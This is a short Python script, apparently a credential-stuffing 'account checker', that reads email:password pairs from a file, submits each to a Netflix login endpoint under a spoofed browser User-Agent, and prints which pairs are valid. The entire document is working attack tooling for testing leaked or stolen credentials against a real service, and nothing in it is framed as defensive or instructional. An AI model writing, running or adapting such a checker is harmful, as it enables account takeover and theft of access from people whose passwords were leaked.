import requests

def check_netflix_logs(email, password):
    url = "https://api.netflix.com/login"
    payload = {
        "email": email,
        "password": password
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    response = requests.post(url, data=payload, headers=headers)
    
    if response.status_code == 200:
        return "Valid credentials"
    elif response.status_code == 401:
        return "Invalid credentials"
    else:
        return "An error occurred"

def check_netflix_logs_from_file(file_path):
    with open(file_path, "r") as file:
        for line in file:
            email, password = line.strip().split(":")
            result = check_netflix_logs(email, password)
            print(f"{email}:{password} - {result}")

file_path = input("Enter path to text file ")
check_netflix_logs_from_file(file_path)
